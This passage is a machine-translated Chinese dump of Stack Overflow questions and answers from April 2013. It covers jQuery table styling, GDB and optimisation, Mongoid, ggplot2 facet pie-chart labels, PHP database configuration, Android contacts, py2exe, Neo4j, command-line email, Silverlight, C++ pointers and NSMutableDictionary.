    $("tr.alt:even").css("background-color", "#f0f8ff");
   $("tr.alt:odd").css("background-color", "#fcfceb");
   $( ".status" ).filter(function(){
     return $(this).text() < 0;
   }).css('background-color', 'red').parent().css('background-color', '#cd0000'); 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-04-24T05:57:07.953

试试这个

JS

```
$(document).ready(function()
{
  $("tr.alt:even").css("background-color", "#f0f8ff");
  $("tr.alt:odd").css("background-color", "#fcfceb");
  $("td" ).each(function() {
     if(parseInt($(this).text())<0)
     {
       $(this).parent().css('background-color', '#cd0000');
       $(this).css("background-color", "red");
     }
  });
}); 
```

HTML

```
<table border="1" cellpadding="4" cellspacing="4">

<tr class="alt">
<td class="status">1</td>
<td class>Received</td>
</tr>
<tr class="alt">
<td class="status">-50</td>
<td class>Received</td>
</tr>
<tr class="alt">
<td class="status">0</td>
<td class>Received</td>
</tr>
<tr class="alt">
<td class="status">20</td>
<td class>Received</td>
</tr>
</table> 
```

[演示](http://jsfiddle.net/Xyb5d/)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-04-24T05:54:35.007

我假设发布的 HTML 超出了您的想象？因为那里有很多不匹配的标签。固定的：

```
<table border="1" cellpadding="4" cellspacing="4">
    <tr class="alt">
        <td class="status">1</td>
        <td class>Received</td>
    </tr>
    <tr class="alt">
        <td class="status">-50</td>
        <td class>Received</td>
    </tr>
    <tr class="alt">
        <td class="status">0</td>
        <td class>Received</td>
    </tr>
    <tr class="alt">
        <td class="status">20</td>
        <td class>Received</td>
    </tr>
</table> 
```

然后，我会将样式移动到样式表（它使一切更易于管理）：

```
tr.alt:nth-child(even) {
    background-color: #f0f8ff;
}
tr.alt:nth-child(odd) {
    background-color: #fcfceb;
}
tr.alt.bad {
    background-color: #cd0000;
} 
```

然后，选择器并不能完全按照这种方式工作，尽管您可以查询行并迭代结果。此外， .val() 用于表单字段；你想要.text()。

```
$(document).ready(function() {
    $('.status').each(function() {
        var $this = $(this);
        if (Number($this.text()) < 0)
            $this.parent().addClass('bad');
    });
}); 
```

你可以在这里看到这个：http: [//jsfiddle.net/MBDKY/](http://jsfiddle.net/MBDKY/)

# c++ - 使用 GDB 调试 C++ 程序时，“下一个”命令似乎会跳过源代码行

> ID：16184181
> 
> 赞同：1
> 
> 时间：2013-04-24T05:40:24.577
> 
> 标签：c++, debugging, gdb

当我调试我的 C++ 程序时，我在`main`函数上设置了一个断点。当程序开始运行时，它似乎在它停止的那一行之前跳过了几行源代码。有什么问题？

![说明问题的屏幕截图](https://i.stack.imgur.com/ADvY4.png)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-24T05:53:46.217

您的程序可能是在启用优化的情况下编译的，这意味着源代码行不一定按顺序翻译成机器代码。在优化下，源代码的不同部分的执行可以重新排序和交错 - 这可能就是您所看到的。

如果您想以简单的、顺序的逐行方式逐步执行源代码，则需要在不进行优化的情况下进行编译 ( `-O0`)。

或者，如果您了解机器代码，您可以使用：

```
set disassemble-next-line on 
```

这将向您显示调试器在其所属的源代码行旁边停止的代码的反汇编。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-24T15:35:21.007

您的程序似乎有符号，因为 GDB 很乐意读取它们。但是，您是否在原始位置有源代码，或者您是否在另一台机器上进行调试？

有什么作用：

```
info source 
```

当你在命令提示符下输入它时给你？它应该给你一些类似的东西：

```
(gdb) info source
Current source file is hello.c
Compilation directory is /home/username/source
Located in /home/username/source/hello.c
Contains 7 lines.
Source language is c.
Compiled with DWARF 2 debugging format.
Includes preprocessor macro info. 
```

如果 GDB 有可用的调试符号和源。

然而，从输出来看，这部分*应该*没问题，所以 caf 很可能是正确的，这与编译器的优化级别有关。

请记住，这正是调试与发布设置的原因。**在开发过程**中，如果您使用 GCC 进行编译，您可能会想要`-O0`或`-O1`结合使用。`-ggdb -g3`对于其他编译器，设置可能不同。**对于一个版本**，您可能希望使用最高的安全优化值（请参阅[此链接](http://www.gentoo.org/doc/en/gcc-optimization.xml)），`-O2`或者`gcc`如果`-O3`您正在使用一种广泛使用的架构并且不害怕令人讨厌的意外。

无论哪种方式，如果您认真对待软件开发并因此进行调试，您应该为您的目标 CPU 学习汇编语言的基础知识。为什么？因为有时优化器，尤其是在 GCC 中，即使你告诉它不信任你的代码，也会出现问题并做一些愚蠢的事情，例如使用`-fno-strict-aliasing`. 我遇到过这样的情况，它很乐意在 SPARC 上使用指令，这些指令应该只用于对齐的数据，但不能保证我们给它的数据是对齐的。无论如何，这正是[Gentoo 推荐`-O2`](http://www.gentoo.org/doc/en/gcc-optimization.xml)的原因，而不是任何更高的优化价值。如果你不知道为什么汇编指令会做它所做的事情，或者为什么你的程序会做一些愚蠢的事情，并且你不能拿着放大镜并降级到汇编级别，那么你'

### 如何在 GDB 中查看汇编代码

正如[caf 所指出的，](https://stackoverflow.com/a/16184340/476371)`set disassemble-next-line on`如果您使用的是 GDB 7.0 或更高版本，您可以使用在当前程序计数器处查看反汇编。在较旧的 GDB 版本上，您可以使用可信赖的旧[`display`命令](http://sourceware.org/gdb/current/onlinedocs/gdb/Auto-Display.html#Auto-Display)：

```
disp/i $pc 
```

它设置程序计数器 ( `$pc`) 的自动显示。也许一个更好、视觉上更吸引人的替代方案，特别是如果你有很多屏幕空间，是在 GDB中使用`layout asm`和组合。`layout regs`请参阅以下屏幕截图：

![布局 asm 和 regs 在 GDB 中组合](https://i.stack.imgur.com/b9Dua.png)

# ruby - 如何使用 Mongoid 在 MongoDB 中自动创建关联记录？

> ID：16184186
> 
> 赞同：2
> 
> 时间：2013-04-24T05:40:33.547
> 
> 标签：ruby, mongoid, associations, autocreate

我仍然在思考`MongoDB`，`Mongoid`尤其是。

假设我有一个`User`，每个`User`人都有一个`Thingamajig`。当我创建时，我希望系统自动为它`User` 创建一个空白。`Thingamajig``User`

每个字段`Thingamajig`都有一个`whatsit`字段，如果它有值，则该字段必须是唯一的，但在创建时允许没有值。

所以我定义了以下类。

```
class Thingamajig
  include Mongoid::Document
  field :whatsit, type: String
  index({whatsit: 1}, {unique: true, name: 'whatsit_index'})
end

class User
  include Mongoid::Document
  field :name, type: String
  index({name: 1}, {unique: true, name: 'user_name_index'})
  embeds_one :thingamajig, dependent: :nullify, autobuild: true
end 
```

但是当我发现

```
User.create!(name: 'some name') 
```

那`User.find(name: 'some name').thingamajig`是零。

问题：

1.  如何确保每个用户都获得关联的 Thingamajig？和
2.  如何指定 a 的`name`字段`User`是必需的？

仅供参考，我没有使用`Sintara`（`Rails`如果这对任何人都很重要）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-27T06:23:15.743

1 - 该`autobuild: true`选项通常应该可以解决问题。我认为问题在于您忘记将关系的另一端添加到 Thingamajig 模型：

```
class Thingamajig
  include Mongoid::Document
  embedded_in :user
  ...
end 
```

2 - 要指定必填字段，请使用[验证](http://mongoid.org/en/mongoid/docs/validation.html)：

```
class User
  include Mongoid::Document
  field :name, type: String
  validates_presence_of :name
  ...
end 
```

Mongoid 使用[ActiveModel 验证](http://guides.rubyonrails.org/active_record_validations_callbacks.html)。

# r - ggplot, facet, piechart：将文本放在饼图切片的中间

> ID：16184188
> 
> 赞同：21
> 
> 时间：2013-04-24T05:40:43.520
> 
> 标签：r, ggplot2, visualization, pie-chart, facet

我正在尝试使用 ggplot 制作一个多面饼图，并面临将文本放在每个切片中间的问题：

```
dat = read.table(text = "Channel Volume Cnt
                         AGENT   high   8344
                         AGENT medium   5448
                         AGENT    low  23823
                         KIOSK   high  19275
                         KIOSK medium  13554
                         KIOSK    low  38293", header=TRUE)

vis = ggplot(data=dat, aes(x=factor(1), y=Cnt, fill=Volume)) +
  geom_bar(stat="identity", position="fill") +
  coord_polar(theta="y") +
  facet_grid(Channel~.) +
  geom_text(aes(x=factor(1), y=Cnt, label=Cnt, ymax=Cnt), 
            position=position_fill(width=1)) 
```

输出： ![在此处输入图像描述](https://i.stack.imgur.com/SlPAR.png)

`geom_text`为了将数字标签放置在饼图切片的中间，应该调整哪些参数？

相关问题是[饼图将其文本放在彼此之上，](https://stackoverflow.com/q/8952077/59470)但它不处理带有刻面的大小写。

更新：按照上面问题中的 Paul Hiemstra 建议和方法，我将代码更改如下：

```
---> pie_text = dat$Cnt/2 + c(0,cumsum(dat$Cnt)[-length(dat$Cnt)])

     vis = ggplot(data=dat, aes(x=factor(1), y=Cnt, fill=Volume)) +
     geom_bar(stat="identity", position="fill") +
     coord_polar(theta="y") +
     facet_grid(Channel~.) +
     geom_text(aes(x=factor(1), 
--->               y=pie_text, 
                   label=Cnt, ymax=Cnt), position=position_fill(width=1)) 
```

正如我所料，调整文本坐标是绝对的，但它需要在方面数据内： ![在此处输入图像描述](https://i.stack.imgur.com/x3so5.png)

* * *

## 回答 #1

> 赞同：45
> 
> 时间：2014-04-02T07:29:42.510

**新答案：**随着**ggplot2 v2.2.0**的引入，`position_stack()`可用于定位标签，而无需先计算位置变量。以下代码将为您提供与旧答案相同的结果：

```
ggplot(data = dat, aes(x = "", y = Cnt, fill = Volume)) + 
  geom_bar(stat = "identity") +
  geom_text(aes(label = Cnt), position = position_stack(vjust = 0.5)) +
  coord_polar(theta = "y") +
  facet_grid(Channel ~ ., scales = "free") 
```

要删除“空心”中心，请将代码修改为：

```
ggplot(data = dat, aes(x = 0, y = Cnt, fill = Volume)) + 
  geom_bar(stat = "identity") +
  geom_text(aes(label = Cnt), position = position_stack(vjust = 0.5)) +
  scale_x_continuous(expand = c(0,0)) +
  coord_polar(theta = "y") +
  facet_grid(Channel ~ ., scales = "free") 
```

* * *

**旧答案：**这个问题的解决方案是创建一个位置变量，这可以很容易地使用 base R 或[data.table](http://cran.r-project.org/web/packages/data.table/index.html)，[plyr](http://cran.r-project.org/web/packages/plyr/index.html)或[dplyr](http://cran.r-project.org/web/packages/dplyr/index.html)包完成：

**第 1 步：**为每个通道创建位置变量

```
# with base R
dat$pos <- with(dat, ave(Cnt, Channel, FUN = function(x) cumsum(x) - 0.5*x))

# with the data.table package
library(data.table)
setDT(dat)
dat <- dat[, pos:=cumsum(Cnt)-0.5*Cnt, by="Channel"]

# with the plyr package
library(plyr)
dat <- ddply(dat, .(Channel), transform, pos=cumsum(Cnt)-0.5*Cnt)

# with the dplyr package
library(dplyr)
dat <- dat %>% group_by(Channel) %>% mutate(pos=cumsum(Cnt)-0.5*Cnt) 
```

**第 2 步：**创建多面图

```
library(ggplot2)
ggplot(data = dat) + 
  geom_bar(aes(x = "", y = Cnt, fill = Volume), stat = "identity") +
  geom_text(aes(x = "", y = pos, label = Cnt)) +
  coord_polar(theta = "y") +
  facet_grid(Channel ~ ., scales = "free") 
```

**结果：**

![在此处输入图像描述](https://i.stack.imgur.com/f8VgK.png)

* * *

## 回答 #2

> 赞同：20
> 
> 时间：2017-12-05T03:42:05.117

我想反对在 ggplot2 中制作馅饼的传统方法，即在极坐标中绘制堆叠的条形图。虽然我很欣赏这种方法在数学上的优雅，但当情节看起来不像它应该的样子时，它确实会引起各种头痛。特别是，精确调整饼图的大小可能很困难。（如果您不明白我的意思，请尝试制作一个一直延伸到绘图面板边缘的饼图。）

`geom_arc_bar()`我更喜欢使用ggforce在正常的笛卡尔坐标系中绘制饼图。它需要在前端做一些额外的工作，因为我们必须自己计算角度，但这很容易，而且我们得到的控制水平非常值得。我在[这里](https://stackoverflow.com/a/47613775/4975218)和[这里以前的答案中使用了这种方法。](https://stackoverflow.com/a/47493452/4975218)

数据（来自问题）：

```
dat = read.table(text = "Channel Volume Cnt
AGENT   high   8344
AGENT medium   5448
AGENT    low  23823
KIOSK   high  19275
KIOSK medium  13554
KIOSK    low  38293", header=TRUE) 
```

饼图代码：

```
library(ggplot2)
library(ggforce)
library(dplyr)

# calculate the start and end angles for each pie
dat_pies <- left_join(dat,
                      dat %>% 
                        group_by(Channel) %>%
                        summarize(Cnt_total = sum(Cnt))) %>%
  group_by(Channel) %>%
  mutate(end_angle = 2*pi*cumsum(Cnt)/Cnt_total,      # ending angle for each pie slice
         start_angle = lag(end_angle, default = 0),   # starting angle for each pie slice
         mid_angle = 0.5*(start_angle + end_angle))   # middle of each pie slice, for the text label

rpie = 1 # pie radius
rlabel = 0.6 * rpie # radius of the labels; a number slightly larger than 0.5 seems to work better,
                    # but 0.5 would place it exactly in the middle as the question asks for.

# draw the pies
ggplot(dat_pies) + 
  geom_arc_bar(aes(x0 = 0, y0 = 0, r0 = 0, r = rpie,
                   start = start_angle, end = end_angle, fill = Volume)) +
  geom_text(aes(x = rlabel*sin(mid_angle), y = rlabel*cos(mid_angle), label = Cnt),
            hjust = 0.5, vjust = 0.5) +
  coord_fixed() +
  scale_x_continuous(limits = c(-1, 1), name = "", breaks = NULL, labels = NULL) +
  scale_y_continuous(limits = c(-1, 1), name = "", breaks = NULL, labels = NULL) +
  facet_grid(Channel~.) 
```

[![在此处输入图像描述](https://i.stack.imgur.com/gZCyC.png)](https://i.stack.imgur.com/gZCyC.png)

为了说明为什么我认为这种方法比传统的 ( `coord_polar()`) 方法强大得多，假设我们希望将标签放在饼的外面而不是里面。这会产生一些问题，例如我们必须根据饼图的一侧调整标签落下的情况，`hjust`而且`vjust`我们必须使绘图面板的宽度大于高度，以便为侧面的标签腾出空间而不生成上下空间过大。在极坐标方法中解决这些问题并不有趣，但在笛卡尔坐标中却很简单：

```
# generate hjust and vjust settings depending on the quadrant into which each
# label falls
dat_pies <- mutate(dat_pies,
                   hjust = ifelse(mid_angle>pi, 1, 0),
                   vjust = ifelse(mid_angle<pi/2 | mid_angle>3*pi/2, 0, 1))

rlabel = 1.05 * rpie # now we place labels outside of the pies

ggplot(dat_pies) + 
  geom_arc_bar(aes(x0 = 0, y0 = 0, r0 = 0, r = rpie,
                   start = start_angle, end = end_angle, fill = Volume)) +
  geom_text(aes(x = rlabel*sin(mid_angle), y = rlabel*cos(mid_angle), label = Cnt,
                hjust = hjust, vjust = vjust)) +
  coord_fixed() +
  scale_x_continuous(limits = c(-1.5, 1.4), name = "", breaks = NULL, labels = NULL) +
  scale_y_continuous(limits = c(-1, 1), name = "", breaks = NULL, labels = NULL) +
  facet_grid(Channel~.) 
```

[![在此处输入图像描述](https://i.stack.imgur.com/16jE8.png)](https://i.stack.imgur.com/16jE8.png)

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2013-04-24T05:50:00.440

要调整标签文本相对于坐标的位置，可以使用 的`vjust`和`hjust`参数`geom_text`。这将同时确定所有标签的位置，因此这可能不是您需要的。

或者，您可以调整标签的坐标。定义一个新`data.frame`的平均`Cnt`坐标 ( `label_x[i] = Cnt[i+1] + Cnt[i]`) 以将标签放置在该特定饼图的中心。只需将这个新的传递`data.frame`给`geom_text`替换原来的`data.frame`.

此外，饼图有一些视觉解释缺陷。一般来说，我不会使用它们，尤其是在存在好的替代品的情况下，例如点图：

```
ggplot(dat, aes(x = Cnt, y = Volume)) + 
  geom_point() + 
  facet_wrap(~ Channel, ncol = 1) 
```

例如，从该图中可以明显看出`Cnt`，Kiosk 高于 Agent，此信息在饼图中丢失。

![在此处输入图像描述](https://i.stack.imgur.com/a9ub0.png)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-24T15:59:49.470

以下答案是部分的，笨拙的，我不会接受。希望它会寻求更好的解决方案。

```
text_KIOSK = dat$Cnt
text_AGENT = dat$Cnt
text_KIOSK[dat$Channel=='AGENT'] = 0
text_AGENT[dat$Channel=='KIOSK'] = 0
text_KIOSK = text_KIOSK/1.7 + c(0,cumsum(text_KIOSK)[-length(dat$Cnt)])
text_AGENT = text_AGENT/1.7 + c(0,cumsum(text_AGENT)[-length(dat$Cnt)])
text_KIOSK[dat$Channel=='AGENT'] = 0
text_AGENT[dat$Channel=='KIOSK'] = 0
pie_text = text_KIOSK + text_AGENT

vis = ggplot(data=dat, aes(x=factor(1), y=Cnt, fill=Volume)) +
  geom_bar(stat="identity", position=position_fill(width=1)) +
  coord_polar(theta="y") +
  facet_grid(Channel~.) +
  geom_text(aes(y=pie_text, label=format(Cnt,format="d",big.mark=','), ymax=Inf), position=position_fill(width=1)) 
```

它产生以下图表： ![在此处输入图像描述](https://i.stack.imgur.com/kKtd1.png)

正如您所注意到的，我无法移动绿色（低）的标签。

# php - SQL 登录仅在访问登录页面后有效

> ID：16184190
> 
> 赞同：0
> 
> 时间：2013-04-24T05:40:54.323
> 
> 标签：php, mysql

我难住了。我有一个 login.php 页面，其中包含我的 index.php 页面顶部的 SQL 登录信息（主机名、数据库、用户名、密码）（使用 require_once）。登录信息在一个条件语句中，该语句确定我是在远程服务器上还是在本地测试服务器上，并提供正确的登录信息。现在这是它变得奇怪的地方，当我直接转到远程服务器上的 index.php 页面时它不起作用（因为它没有与数据库建立连接）但是它确实在测试服务器上工作并且它如果我首先访问远程服务器上的 login.php 站点（不回显任何内容）然后访问远程服务器上的 index.php 页面，则可以工作。我禁用了缓存。为什么会发生这种情况，我该如何解决？通过访问自己尝试[先http://distantfuturejosh.com/playground/pendingaxioms](http://distantfuturejosh.com/playground/pendingaxioms)（不行），然后访问[http://distantfuturejosh.com/playground/pendingaxioms/login.php](http://distantfuturejosh.com/playground/pendingaxioms/login.php)（提供空白页），然后返回[http： //distantfuturejosh.com/playground/pendingaxioms](http://distantfuturejosh.com/playground/pendingaxioms)（它会起作用，你会看到图像出现）。

这是 login.php 页面：

```
<?php

    $requesturi = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    $pos = strpos($requesturi, "www.distantfuturejosh.com");

    if ($pos === 0)
    {
        $db_hostname = "xxxxxxxx";
        $db_database = "xxxxxxxx";
        $db_username = "xxxxxxxx";
        $db_password = "xxxxxxxx";
    }
    else
    {
        $db_hostname = "localhost";
        $db_database = "xxxxxxxx";
        $db_username = "root";
        $db_password = "root";
    }

?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T05:42:55.857

尝试使用

```
session_start(); 
```

在文件的开头。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-24T06:57:35.890

尝试使用`if ($pos === false)`而不是`if ($pos === 0)`这样

```
<?php

    $requesturi = $_SERVER['HTTP_HOST'];
    $pos = strpos($requesturi, "distantfuturejosh");

    if ($pos === false)
    {  //local
        $db_hostname = "localhost";
        $db_database = "xxxxxxxx";
        $db_username = "root";
        $db_password = "root";
    }
    else
    {  //remote
        $db_hostname = "xxxxxxxx";
        $db_database = "xxxxxxxx";
        $db_username = "xxxxxxxx";
        $db_password = "xxxxxxxx";
    }

?> 
```

我想你检查用户登录并包含`login.php`在你的其他 PHP 页面中`include /subfolder/login.php;`

# android - Android 联系人信息是如何存储的？

> ID：16184193
> 
> 赞同：3
> 
> 时间：2013-04-24T05:41:27.907
> 
> 标签：android

我正在编写一个处理 Android 联系人信息的类，经过一番努力，我编写了一个函数来检索有关用户联系人的所有信息，包括所有电话号码、电子邮件地址、邮政地址等。但是，我仍然没有不明白这些信息是如何存储在手机中的，所以我希望有人能给我一些见解。

因此，一个用户可以有多个电话号码、多个电子邮件地址等。对于`ContactsContract.Contacts.CONTENT_URI`包含所有联系人的表的联系人和您拥有的电话号码`ContactsContract.CommonDataKinds.Phone.CONTENT_URI`。但是还有`ContactsContract.RawContacts.CONTENT_URI`，我认为它应该包含您联系人的所有数据。我的假设是，在 Contacts 表中，联系人 ID 是单独行的唯一标识符，而对于 Phone 表，电话号码是唯一行标识符。如果 RawContacts 包含 ContactsContract 类的所有列，那么每一行都没有唯一标识符，因为每个联系人可能被分配多个电话号码、多个电子邮件地址等。换句话说，我不明白这样的表是结构化的。

所以我的问题是：包含联系信息的各种表——Contacts、Phone、Email、StructuredPostal 等——是完全独立的，还是从较大的 RawContacts 表中提取的每个表的信息？还是我误解了 RawContacts 是什么？由于我正在编写的课程将帮助将联系人从电话联系人列表移动到单独的数据库中，因此了解这些信息将帮助我了解我应该将信息存储在多个数据库中还是只存储一个数据库中（类似于我上面描述的 RawContacts 数据库） .

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T05:48:08.517

android API Guide[`Contacts Provider`](https://developer.android.com/guide/topics/providers/contacts-provider.html)很好地描述了联系人表的存储方式（有点复杂，允许合并许多联系人）

### 数据层次结构图

![来自 android api 指南的联系人提供者数据层次结构](https://i.stack.imgur.com/hmjsw.png)

### 你的问：

> 所以我的问题是：包含联系信息的各种表——Contacts、Phone、Email、StructuredPostal 等——是完全独立的，还是从较大的 RawContacts 表中提取的每个表的信息？

再次查看文档（我没有针对这些表进行编码，只阅读文档），电话、电子邮件...表似乎是分开的。但是，信息看起来存储在两个表中，即联系人以及 RawContacts。

# python - 在中文版XP上使用py2exe编译时，如何让应用程序在英文版XP下运行？

> ID：16184199
> 
> 赞同：1
> 
> 时间：2013-04-24T05:41:35.593
> 
> 标签：python, windows, py2exe

我在 Windows XP（中文版）中使用 py2exe 编译了我的 Python 程序，但它不能在 Windows XP（英文版）上运行。当我在 Windows XP 的英文版中运行它时，窗口显示：

> 此应用程序无法启动，因为应用程序配置不正确。重新安装应用程序可能会解决问题。

在中文版XP上编译，如何让应用程序在英文版XP下运行？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T14:00:00.093

我认为您的问题不在于您创建 .exe 的语言。查看此线程[应用程序无法启动...应用程序配置不正确 - VC++ 2005 运行时问题](https://stackoverflow.com/questions/265481/application-has-failed-to-start-application-configuration-is-incorrect-vc)。您必须包含 VC++ 运行时的 dll，如下所示：

```
Microsoft.VC90.CRT.manifest
msvcm90.dll
msvcp90.dll
msvcr71.dll
msvcr90.dll 
```

把它放到你的 dist 文件夹中。并在 Windows XP 中用英语测试您的应用程序。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-26T19:17:26.967

查看这个链接[链接](http://www.py2exe.org/index.cgi/Tutorial#Step521)，也许你已经安装在它的目录下，按照这个路径 C:\Windows\winsxs\x86_microsoft.vc90.crt_1fc8b3b9a1e18e3b_9.0.30729.1_none_e163563597edeada\

另一方面寻找谷歌vc++运行时，看看这个[link1](http://msdn.microsoft.com/aa570309)和[link2](http://msdn.microsoft.com/en-us/library/ms235299%28v=vs.90%29.aspx)

希望它可以帮助你。

# neo4j - 使用 Java 6 运行嵌入式非 HA Neo4j 1.9 的任何已知问题？

> ID：16184200
> 
> 赞同：1
> 
> 时间：2013-04-24T05:41:36.993
> 
> 标签：neo4j

虽然我完全知道应该升级到 Java 7，但在此之前，使用 Java 6 的 Neo4j 1.9 (RC1) 是否存在任何已知问题？我在嵌入式模式下使用它，非 HA。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T08:11:11.930

我使用的是完全相同的环境，没有遇到任何问题。如果您使用 SDN，您可能会遇到一些问题，但我想它们很快就会得到解决。参见例如[DATAGRAPH-338](https://jira.springsource.org/browse/DATAGRAPH-338)。

# linux - 如何从命令提示符发送电子邮件？

> ID：16184201
> 
> 赞同：2
> 
> 时间：2013-04-24T05:41:42.337
> 
> 标签：linux, email, smtp, command

有没有办法在linux终端发送简单的电子邮件？

```
to: somebody@gmail.com
sub: Sending email from linux terminal
body: This is a short email sent from linux terminal 
```

我需要设置什么样的堆栈或 smtp？我该如何设置它们？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-24T06:59:41.167

终端版本：

```
mail somebody@gmail.com 
```

shell脚本的版本：

```
echo "This is a short email" | mail -n -s "Sending email" somebody@gmail.com 
```

AFAIK 典型的 Linux 发行版默认安装 MTA（sendmail/postfix/exim/...）。如果您有静态公共 IP 地址，那么您很可能有一个有效的自我配置。

没有静态公共 IP 的 MTA 配置更加棘手。

# c# - System.Security.SecurityException 与 WebClient GET 请求

> ID：16184202
> 
> 赞同：1
> 
> 时间：2013-04-24T05:41:46.923
> 
> 标签：c#, silverlight

我正在编写一个 Silverlight 应用程序，它需要通过 GET/POST 请求与服务器交互。我的代码如下所示：

```
Uri serviceUri = new Uri(my_URI);
WebClient client = new WebClient();

client.OpenReadCompleted += new OpenReadCompletedEventHandler(OnRequestComplete);
client.OpenReadAsync(serviceUri); 
```

但是，当调用回调函数时，我得到了 System.Security.SecurityException。我在这里从有类似错误的人那里阅读了多个问题，但是他们的所有问题似乎都源于调试时的跨域问题。当我运行我的代码时，它`http://localhost:...`作为域运行，所以这不应该是我不认为的问题。如果这有帮助，这是完整的错误：

```
{System.Security.SecurityException: Security error.
   at System.Net.Browser.BrowserHttpWebRequest.InternalEndGetResponse(IAsyncResult asyncResult)
   at System.Net.Browser.BrowserHttpWebRequest.<>c__DisplayClassa.<EndGetResponse>b__9(Object sendState)
   at System.Net.Browser.AsyncHelper.<>c__DisplayClass4.<BeginOnUI>b__0(Object sendState)} 
```

谢谢你的帮助。这是一个非常令人沮丧的问题。

更新：

我搞砸了很多，最终让一切正常工作。虽然不是 100% 做了什么...我最终将 clientaccesspolicy.xml 和 crossdomain.xml 文件复制/粘贴到任何可以想象的地方，创建了一个新的 Silverlight 项目并复制了那里的所有内容，以及其他一些东西。如果其他人遇到这个问题，这就是我必须给出的建议：/

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T06:02:56.380

我认为它仍然违反同源策略，因为端口号不匹配：即 XAP uri 的端口和 my_URI 端口不匹配。因此`System.Security.SecurityException`. 您能否尝试托管相对于您的 XAP 的 my_URI。

或者更好的是，您可以尝试使用 WCF 与服务器交互吗？

# c++ - 如何将指向对象的指针设置为 Null？C++

> ID：16184203
> 
> 赞同：-1
> 
> 时间：2013-04-24T05:41:52.657
> 
> 标签：c++, pointers, null, segmentation-fault

我正在开发一款 roguelike 游戏，我将其设置为在 MOST 一个关卡上会有 3 个怪物。所以我有3个指向怪物的指针。它们都以 NULL 开始。

在那个怪物死后，我应该如何将指针设置回 NULL？或者，也许我有错误的想法？本质上，我需要移除怪物，直到该指针重新生成为另一个怪物。

我已经尝试了一些事情，但我只是不断遇到段错误。

我尝试使用擦除、删除，只需将其设置为 NULL，然后重新指向它。想不通。

这是我设置指针的方式：

```
CreatureFactory myCreatures = CreatureFactory::instance();
    Creature * pCreature1 = NULL;
    Creature * pCreature2 = NULL;
    Creature * pCreature3 = NULL;;

    ItemFactory myItems = ItemFactory::instance();
    Item * pItem1 = myItems.generateItem();

    dl.placeInGame(personPlaying,randomGen);
    int monsterCount = 0;
    int turnCount = 0;
    bool playingGame = true;
    char playerController;

    while (playingGame){
            if ((turnCount % 2 == 0) && (personPlaying.getHP() < personPlay$
                    personPlaying.generateHP();
            }
            if (((turnCount % 3) == 0) && (monsterCount < 2)){
                    if(pCreature1 == NULL){
                            pCreature1 = myCreatures.generateCreature(4);
                            dl.placeInGame(pCreature1,randomGen);
                            monsterCount += 1;
                    }
                    else if(pCreature2 == NULL){
                            pCreature2 = myCreatures.generateCreature(4);
                            dl.placeInGame(pCreature2, randomGen);
                            monsterCount += 1;
                    }
                    else if(pCreature3 == NULL){
                            pCreature3 = myCreatures.generateCreature(4);
                            monsterCount += 1;
                    }
            }
            dl.dump();
            personPlaying.dumpStats(); 
```

* * *

```
 CreatureFactory code..
 CreatureFactory & CreatureFactory::instance(){
    static CreatureFactory myObj;
    return myObj;
}

CreatureFactory::CreatureFactory(){
    m_mtRandom.seed( time(NULL) );
    fstream xmlFile;
    xmlFile.open("critters.xml");
    vector<XMLSerializable*> pObjects;
    parseXML(xmlFile, pObjects);

    XMLSerializable * pObject;

    for(auto it = pObjects.begin(); it != pObjects.end(); it++){
            pObject = (*it);
            Creature * pCreature = dynamic_cast<Creature*>(pObject);
            if (pCreature != NULL){
                    m_vCreatures.push_back(pCreature);
            }
    }
}

CreatureFactory::~CreatureFactory(){

}
    Creature * CreatureFactory::generateCreature(int iMaxLevel) {
    vector<Creature*> tempCreatures;

    for(auto it = m_vCreatures.begin(); it != m_vCreatures.end(); it++){
            if ((*it)->getLevel() <= iMaxLevel){
                    tempCreatures.push_back((*it));
            }
    }
    int randomCreature = (m_mtRandom() % (tempCreatures.size() - 1));

    Creature * pCreature = tempCreatures.at(randomCreature);

    Creature * pReturnValue = new Creature(*pCreature);

    return pReturnValue;
} 
```

然后我做了大量的循环并使用了大量的类。指向这些怪物对象的指针通过大约 6 或 7 个类传递。当 HP 达到 0 时，我需要将其中之一设置为 NULL。

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-24T08:54:38.180

在 c++ 中，您不应该将指针设置为 null，因为 Object 仍将存在于内存中，但没有对它的任何引用-> 内存泄漏。相反，您应该删除对象：

```
delete pCreatureN; 
```

这基本上会从内存中删除对象~~并使指针成为空指针~~。之后`pCreatureN = NULL;`就好了。

# ios - 为什么 NSMutableDictionary 会丢失数据？

> ID：16184213
> 
> 赞同：1
> 
> 时间：2013-04-24T05:42:49.943
> 
> 标签：ios, objective-c

我正在使用`NSMutableDictionary`. 使用属性声明它，如下所示：

```
@property (strong, nonatomic) NSMutableDictionary *books; 
```

在该方法中，我为其赋值。

```
- (void)setUpBooks {
     if (self.books == nil){
         self.books = [[NSMutableDictionary alloc] init];
     }
     // my code goes here...
     [self.books setObject:book forKey:key];

     NSLog(@"books : %@",self.books);
     NSLog(@"books Count : %d",[self.books count]);
 } 
```

在此`NSLog`它显示正确的值。但是当我尝试`self.books`在另一种方法中使用它的显示`null`。我不知道我的数据丢失在哪里。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-04-24T06:26:27.867

使用 NSMutableDictionay 的简单方法。

尝试这个，

```
NSMutableDictionary * books = [[NSMutableDictionary alloc] init];

NSDictionary *book = [[NSDictionary alloc] initWithObjectsAndKeys:@"Value",@"BOOK_KEY", nil];

[books addEntriesFromDictionary:book]; 
```

希望对你有帮助。

# android - 在布局的绝对中心显示一个矩形框

> ID：16184217
> 
> 赞同：5
> 
> 时间：2013-04-24T05:42:56.683
